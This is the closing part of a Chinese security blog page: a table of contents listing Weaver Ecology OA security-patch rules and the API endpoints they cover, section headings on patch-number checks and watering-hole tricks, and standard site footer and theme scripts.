class="toc-link" href="#Ecology-security-20210623-v10-40"><span class="toc-number">2.1.17.</span> <span class="toc-text">Ecology_security_20210623_v10.40</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleCloudstoreJsp"><span class="toc-number">2.1.17.1.</span> <span class="toc-text">SecurityRuleCloudstoreJsp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HomePageSecurityRule"><span class="toc-number">2.1.17.2.</span> <span class="toc-text">HomePageSecurityRule</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleGoPage"><span class="toc-number">2.1.17.3.</span> <span class="toc-text">SecurityRuleGoPage</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ecology-security-20210721-v10-41"><span class="toc-number">2.1.18.</span> <span class="toc-text">Ecology_security_20210721_v10.41</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleDyf"><span class="toc-number">2.1.18.1.</span> <span class="toc-text">SecurityRuleDyf</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleMobileMode"><span class="toc-number">2.1.18.2.</span> <span class="toc-text">SecurityRuleMobileMode</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ecology-security-20210824-v10-42"><span class="toc-number">2.1.19.</span> <span class="toc-text">Ecology_security_20210824_v10.42</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A0%E9%99%A4%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">2.1.19.1.</span> <span class="toc-text">删除信息泄露</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleForMould0915"><span class="toc-number">2.1.19.2.</span> <span class="toc-text">SecurityRuleForMould0915</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BD%AE%E7%A9%BA-odoc-x2F-odoc-x2F-odoc-double-screen-jsp%E6%96%87%E4%BB%B6"><span class="toc-number">2.1.19.3.</span> <span class="toc-text">置空 odoc&#x2F;odoc&#x2F;odoc_double_screen.jsp文件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ecology-security-20211226-v10-43"><span class="toc-number">2.1.20.</span> <span class="toc-text">Ecology_security_20211226_v10.43</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleSQL50"><span class="toc-number">2.1.20.1.</span> <span class="toc-text">SecurityRuleSQL50</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleTableDev0308"><span class="toc-number">2.1.20.2.</span> <span class="toc-text">SecurityRuleTableDev0308</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#x2F-api-x2F-ec-x2F-dev-x2F-table-x2F-cleartemp-1"><span class="toc-number">2.1.20.2.1.</span> <span class="toc-text">&#x2F;api&#x2F;ec&#x2F;dev&#x2F;table&#x2F;cleartemp</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#x2F-api-x2F-common-x2F-log-x2F-audit-x2F-getfile"><span class="toc-number">2.1.20.2.2.</span> <span class="toc-text">&#x2F;api&#x2F;common&#x2F;log&#x2F;audit&#x2F;getfile</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#x2F-api-x2F-odoc-x2F-odocFile-x2F-confirmTemplate"><span class="toc-number">2.1.20.2.3.</span> <span class="toc-text">&#x2F;api&#x2F;odoc&#x2F;odocFile&#x2F;confirmTemplate</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#x2F-api-x2F-v1-x2F-3rd-x2F-file-x2F-save"><span class="toc-number">2.1.20.2.4.</span> <span class="toc-text">&#x2F;api&#x2F;v1&#x2F;3rd&#x2F;file&#x2F;save</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#x2F-api-x2F-ec-x2F-dev-x2F-table-x2F-export"><span class="toc-number">2.1.20.2.5.</span> <span class="toc-text">&#x2F;api&#x2F;ec&#x2F;dev&#x2F;table&#x2F;export</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#x2F-api-x2F-edc-x2F-dataexport-x2F-export"><span class="toc-number">2.1.20.2.6.</span> <span class="toc-text">&#x2F;api&#x2F;edc&#x2F;dataexport&#x2F;export</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SercurityRuleForCptInventory"><span class="toc-number">2.1.20.3.</span> <span class="toc-text">SercurityRuleForCptInventory</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#x2F-api-x2F-cpt-x2F-inventory-x2F-docptimpoptinventory"><span class="toc-number">2.1.20.3.1.</span> <span class="toc-text">&#x2F;api&#x2F;cpt&#x2F;inventory&#x2F;docptimpoptinventory</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#x2F-api-x2F-cpt-x2F-exceltodb-x2F-importdata"><span class="toc-number">2.1.20.3.2.</span> <span class="toc-text">&#x2F;api&#x2F;cpt&#x2F;exceltodb&#x2F;importdata</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#x2F-api-x2F-cpt-x2F-exceltodb-x2F-importassort"><span class="toc-number">2.1.20.3.3.</span> <span class="toc-text">&#x2F;api&#x2F;cpt&#x2F;exceltodb&#x2F;importassort</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SercurityRuleForOdoc"><span class="toc-number">2.1.20.4.</span> <span class="toc-text">SercurityRuleForOdoc</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ecology-security-20220525-v10-45"><span class="toc-number">2.1.21.</span> <span class="toc-text">Ecology_security_20220525_v10.45</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A0%E9%99%A4findclassfromjar-jsp%E9%80%BB%E8%BE%91"><span class="toc-number">2.1.21.1.</span> <span class="toc-text">删除findclassfromjar.jsp逻辑</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRule20220429"><span class="toc-number">2.1.21.2.</span> <span class="toc-text">SecurityRule20220429</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleForAPI"><span class="toc-number">2.1.21.3.</span> <span class="toc-text">SecurityRuleForAPI</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleForHttpForward"><span class="toc-number">2.1.21.4.</span> <span class="toc-text">SecurityRuleForHttpForward</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleForMecAction"><span class="toc-number">2.1.21.5.</span> <span class="toc-text">SecurityRuleForMecAction</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleForNewsTemplateAction0424"><span class="toc-number">2.1.21.6.</span> <span class="toc-text">SecurityRuleForNewsTemplateAction0424</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleForSearchTM"><span class="toc-number">2.1.21.7.</span> <span class="toc-text">SecurityRuleForSearchTM</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleForSrc0416"><span class="toc-number">2.1.21.8.</span> <span class="toc-text">SecurityRuleForSrc0416</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleForSystemImportUpload"><span class="toc-number">2.1.21.9.</span> <span class="toc-text">SecurityRuleForSystemImportUpload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleForSYUploadLog"><span class="toc-number">2.1.21.10.</span> <span class="toc-text">SecurityRuleForSYUploadLog</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleNetworkDisk"><span class="toc-number">2.1.21.11.</span> <span class="toc-text">SecurityRuleNetworkDisk</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SercurityRuleForCptInventoryListImp"><span class="toc-number">2.1.21.12.</span> <span class="toc-text">SercurityRuleForCptInventoryListImp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SercurityRuleForHrmInventoryListImp"><span class="toc-number">2.1.21.13.</span> <span class="toc-text">SercurityRuleForHrmInventoryListImp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ecology-security-20220618-v10-47"><span class="toc-number">2.1.22.</span> <span class="toc-text">Ecology_security_20220618_v10.47</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleCloudStore0706"><span class="toc-number">2.1.22.1.</span> <span class="toc-text">SecurityRuleCloudStore0706</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#x2F-api-x2F-ec-x2F-dev-x2F-util-x2F-clearaccesspage"><span class="toc-number">2.1.22.1.1.</span> <span class="toc-text">&#x2F;api&#x2F;ec&#x2F;dev&#x2F;util&#x2F;clearaccesspage</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#x2F-api-x2F-ec-x2F-dev-x2F-search-x2F-count"><span class="toc-number">2.1.22.1.2.</span> <span class="toc-text">&#x2F;api&#x2F;ec&#x2F;dev&#x2F;search&#x2F;count</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#x2F-api-x2F-ec-x2F-mode-x2F-search-x2F-config"><span class="toc-number">2.1.22.1.3.</span> <span class="toc-text">&#x2F;api&#x2F;ec&#x2F;mode&#x2F;search&#x2F;config</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleForWeb0704"><span class="toc-number">2.1.22.2.</span> <span class="toc-text">SecurityRuleForWeb0704</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SercurityRuleForGovern"><span class="toc-number">2.1.22.3.</span> <span class="toc-text">SercurityRuleForGovern</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SercurityRuleForIntegrationAction"><span class="toc-number">2.1.22.4.</span> <span class="toc-text">SercurityRuleForIntegrationAction</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#securityagenttest-jsp%E7%BD%AE%E7%A9%BA"><span class="toc-number">2.1.22.5.</span> <span class="toc-text">securityagenttest.jsp置空</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ecology-security-20220716-v10-48"><span class="toc-number">2.1.23.</span> <span class="toc-text">Ecology_security_20220716_v10.48</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SercurityRuleForIntegrationBrowser"><span class="toc-number">2.1.23.1.</span> <span class="toc-text">SercurityRuleForIntegrationBrowser</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SercurityRuleForSourceFileds"><span class="toc-number">2.1.23.2.</span> <span class="toc-text">SercurityRuleForSourceFileds</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#x2F-api-x2F-mobilemode-x2F-admin-x2F-designer-x2F-plugin-x2F-getSourceFields"><span class="toc-number">2.1.23.2.1.</span> <span class="toc-text">&#x2F;api&#x2F;mobilemode&#x2F;admin&#x2F;designer&#x2F;plugin&#x2F;getSourceFields</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ecology-security-20220726-v10-49"><span class="toc-number">2.1.24.</span> <span class="toc-text">Ecology_security_20220726_v10.49</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleInitMobileConfig"><span class="toc-number">2.1.24.1.</span> <span class="toc-text">SecurityRuleInitMobileConfig</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SercurityRuleForWfImport"><span class="toc-number">2.1.24.2.</span> <span class="toc-text">SercurityRuleForWfImport</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ecology-security-20220728-v10-50"><span class="toc-number">2.1.25.</span> <span class="toc-text">Ecology_security_20220728_v10.50</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleForEcLocaleSQL"><span class="toc-number">2.1.25.1.</span> <span class="toc-text">SecurityRuleForEcLocaleSQL</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ecology-security-20220731-v10-52"><span class="toc-number">2.1.26.</span> <span class="toc-text">Ecology_security_20220731_v10.52</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SercurityRuleForHrmImportListImp"><span class="toc-number">2.1.26.1.</span> <span class="toc-text">SercurityRuleForHrmImportListImp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ecology-security-20220804-v10-53"><span class="toc-number">2.1.27.</span> <span class="toc-text">Ecology_security_20220804_v10.53</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleForDownload"><span class="toc-number">2.1.27.1.</span> <span class="toc-text">SecurityRuleForDownload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleForMobileApp"><span class="toc-number">2.1.27.2.</span> <span class="toc-text">SecurityRuleForMobileApp</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#x2F-api-x2F-workflow-x2F-reqform-x2F-getHtmlToPdf"><span class="toc-number">2.1.27.2.1.</span> <span class="toc-text">&#x2F;api&#x2F;workflow&#x2F;reqform&#x2F;getHtmlToPdf</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#x2F-login-x2F-Loginoperation-jsp"><span class="toc-number">2.1.27.2.2.</span> <span class="toc-text">&#x2F;login&#x2F;Loginoperation.jsp</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SercurityRuleForWfImportInfo"><span class="toc-number">2.1.27.3.</span> <span class="toc-text">SercurityRuleForWfImportInfo</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#x2F-api-x2F-workflow-x2F-workflowImport-x2F-getImportInfo"><span class="toc-number">2.1.27.3.1.</span> <span class="toc-text">&#x2F;api&#x2F;workflow&#x2F;workflowImport&#x2F;getImportInfo</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#x2F-api-x2F-workflow-x2F-wfexceldesign-x2F-excelImport"><span class="toc-number">2.1.27.3.2.</span> <span class="toc-text">&#x2F;api&#x2F;workflow&#x2F;wfexceldesign&#x2F;excelImport</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ecology-security-20220815-v10-54"><span class="toc-number">2.1.28.</span> <span class="toc-text">Ecology_security_20220815_v10.54</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleGetData"><span class="toc-number">2.1.28.1.</span> <span class="toc-text">SecurityRuleGetData</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleLoginKey"><span class="toc-number">2.1.28.2.</span> <span class="toc-text">SecurityRuleLoginKey</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleUploaderOperate"><span class="toc-number">2.1.28.3.</span> <span class="toc-text">SecurityRuleUploaderOperate</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ecology-security-20221014-v10-55"><span class="toc-number">2.1.29.</span> <span class="toc-text">Ecology_security_20221014_v10.55</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleForWeb0927"><span class="toc-number">2.1.29.1.</span> <span class="toc-text">SecurityRuleForWeb0927</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleSQL1019"><span class="toc-number">2.1.29.2.</span> <span class="toc-text">SecurityRuleSQL1019</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ecology-security-20230213-v10-56"><span class="toc-number">2.1.30.</span> <span class="toc-text">Ecology_security_20230213_v10.56</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleForGetLog"><span class="toc-number">2.1.30.1.</span> <span class="toc-text">SecurityRuleForGetLog</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleForMobileBrowser"><span class="toc-number">2.1.30.2.</span> <span class="toc-text">SecurityRuleForMobileBrowser</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleForScriptEngine"><span class="toc-number">2.1.30.3.</span> <span class="toc-text">SecurityRuleForScriptEngine</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleForSpaJs0505"><span class="toc-number">2.1.30.4.</span> <span class="toc-text">SecurityRuleForSpaJs0505</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SecurityRuleForSpaJs2028728"><span class="toc-number">2.1.30.5.</span> <span class="toc-text">SecurityRuleForSpaJs2028728</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#tricks"><span class="toc-number">3.</span> <span class="toc-text">tricks</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%A1%A5%E4%B8%81%E5%8F%B7"><span class="toc-number">3.1.</span> <span class="toc-text">获取补丁号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B0%B4%E5%9D%91"><span class="toc-number">3.2.</span> <span class="toc-text">水坑</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#OA%E7%AB%AF"><span class="toc-number">3.2.1.</span> <span class="toc-text">OA端</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF"><span class="toc-number">3.2.2.</span> <span class="toc-text">服务器端</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E4%BB%BB%E6%84%8F%E7%B1%BB%E8%B0%83%E7%94%A8"><span class="toc-number">3.2.3.</span> <span class="toc-text">查任意类调用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="toc-number">3.2.4.</span> <span class="toc-text">查文件下载</span></a></li></ol></li></ol></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url('/./img/random/material-15.png')"><div id="footer-wrap"><div class="copyright">&copy;2016 - 2023 By Sp4ce</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>function panguFn () {
  if (typeof pangu === 'object') pangu.autoSpacingPage()
  else {
    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
      .then(() => {
        pangu.autoSpacingPage()
      })
  }
}

function panguInit () {
  if (false){
    GLOBAL_CONFIG_SITE.isPost && panguFn()
  } else {
    panguFn()
  }
}

document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'pFyFD9ztxm24V3fTYbcslwPv-MdYXbMMI',
      appKey: 'sW9q4Ntrbowadsh5sHB8V31r',
      avatar: 'mm',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !true) {
  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script></div><canvas id="universe"></canvas><script data-pjax src="/js/bubbles.js"></script><script data-pjax src="/js/universe.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="富强,民主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="15px" data-random="true" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":true,"display":{"position":"right","width":300,"height":600,"vOffset":-50},"mobile":{"show":false},"dialog":{"enable":false,"hitokoto":false},"react":{"opacity":0.7},"model":{"jsonPath":"/live2dw/assets/miku.model.json"},"log":false});</script></body></html>